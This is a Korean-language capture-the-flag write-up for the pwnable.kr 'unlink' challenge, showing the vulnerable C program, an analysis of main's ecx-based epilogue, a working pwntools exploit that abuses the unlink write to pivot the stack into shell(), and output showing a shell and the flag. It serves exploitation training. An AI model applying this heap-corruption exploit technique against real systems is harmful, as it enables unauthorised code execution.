# [pwnable.kr] unlink writeup



```shell
Daddy! how can I exploit unlink corruption?

ssh unlink@pwnable.kr -p2222 (pw: guest)
```

memory corruption 문제이다. unlink 얘기가 나오는걸 보니 heap 문제인듯



#### unlink.c

문제 파일은 다음과 같다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

double linked list의 unlink 과정을 직접 함수를 이용하여 구현하였다. OBJ A에서 `gets()`로 입력을 받기 때문에, heap overflow가 발생하여 A의 buf부터 B, C... 를 모두 덮을 수 있다.

OBJ B의 fd, bk를 조작하여 unlink() 과정을 통해 control flow를 shell()이 실행되도록 조작해보자.



친절하게도 stack 주소와 heap 주소를 제공해준다. 

맨 처음에 든 생각은 main 함수의 `ret`를 `shell()`로 덮어씌우는 거였지만, `unlink()`는 양 쪽 주소 모두에 값을 덮어씌우는 것이기 때문에(`*bk=fd`, `*(fd+0x4)=bk`), `shell()`의 주소에 값을 덮어씌울 수가 없어 불가능하다.



다음으로 생각한 방법은 `ebp`를 건드리는 것이었다.

 `main()`의 `ebp`가 아니라 `unlink()`의 `ebp`를 `shell()`의 주소가 저장되어 있는 heap 주소 - 0x4로 덮는다면, unlink()가 종료되고 heap 공간을 stack처럼 사용하다가, `main()`의 `leave; ret`이 실행되면서 `shell()`이 실행될 것이라는 각을 세웠다.



아니 근데... 흥항ㅎ앟ㅇ 하면서 시도하다가, 유심히 살펴보니 main()의 함수의 에필로그 동작이 다음과 같다는 것을 발견했다..

```shell
   0x08048602 <+211>:	leave  
   0x08048603 <+212>:	lea    esp,[ecx-0x4]
   0x08048606 <+215>:	ret   
```



;; 가끔 `main()`의 prologue와 epilogue가 아주 전형적인 prologue, epilogue가 아니라 위와 같이 push를 좀 더 많이 하며 ecx를 사용하는 경우가 있다.

이는 stack에서의 main() 함수의 시작을 16byte 단위로 정렬하기 위함이다. 사실 이런 현상은 다른 서브 함수에 대해서는 caller들이 메모리를 정렬해 주기 때문에 `main()`에서 밖에 관찰할 수 없다.



결국 저녀석도 esp를 조작하기 위함이니 해당 에필로그 동작에 맞춰 control flow를 조작하는 방법밖에 없는 듯하다.

자세히 살펴보면 `main_ebp-0x4`에 있는 값에서 0x4만큼 뺀 값을 esp로 저장하기 때문에, 결국 `main_ebp-0x4`에 `shell()` 주소가 담겨있는 `heap 주소 - 0x4`를 저장하면 된다!

#### payload

```python
# /usr/bin/python
from pwn import *

r = process("/home/unlink/unlink")

stack_addr = int(r.recvline().split(':')[1], 16)
heap_addr = int(r.recvline().split(':')[1], 16)
ebp_addr = stack_addr + 0x14

r.recvuntil('get shell!\n')

print(hex(stack_addr))
print(hex(heap_addr))

payload = "A"*8
payload += p32(0)
payload += p32(0x19)
payload += p32(heap_addr + 0x24)
payload += p32(ebp_addr - 0x4)
payload += p32(0x080484eb)

r.sendline(payload)
r.interactive()
```



```shell
[+] Starting local process '/home/unlink/unlink': Done
0xffd99b54
0x9d5f410
>
[*] Switching to interactive mode
$ id
uid=1094(unlink) gid=1094(unlink) egid=1095(unlink_pwn) groups=1095(unlink_pwn),1094(unlink)
$ cat /home/unlink/flag
conditional_write_what_where_from_unl1nk_explo1t
```

